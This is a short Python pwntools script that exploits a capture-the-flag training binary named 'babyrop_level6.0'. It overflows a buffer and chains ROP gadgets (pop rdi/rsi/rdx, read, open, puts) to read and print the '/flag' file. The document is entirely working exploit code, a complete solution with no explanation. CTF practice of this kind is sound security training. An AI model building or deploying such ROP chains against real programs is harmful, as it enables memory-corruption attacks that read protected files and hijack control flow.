from pwn import *

puts = 0x401130
open = 0x4011d0
sendfile = 0x40209b
pop_rdi = 0x4020af
pop_rsi = 0x4020bf
pop_rdx = 0x4020b7
buffer = 0x405e00
leave_ret = 0x401763
read_1 = 0x401160
r = process('/challenge/babyrop_level6.0')

#r = process(['strace','/challenge/babyrop_level6.0'])
#r = process(['sudo','strace','/challenge/babyrop_level6.0'])

payload = b'/'.ljust(0x48,b'\x00')
payload += p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x10) + p64(read_1) ## write /flag to buffer
payload += p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(open) ## open 
payload += p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(80) + p64(read_1) ## read /flag 
payload += p64(pop_rdi) + p64(buffer) + p64(puts)
r.send(payload+ b'\x00'*0x30)
r.send(b'/flag')

r.interactive()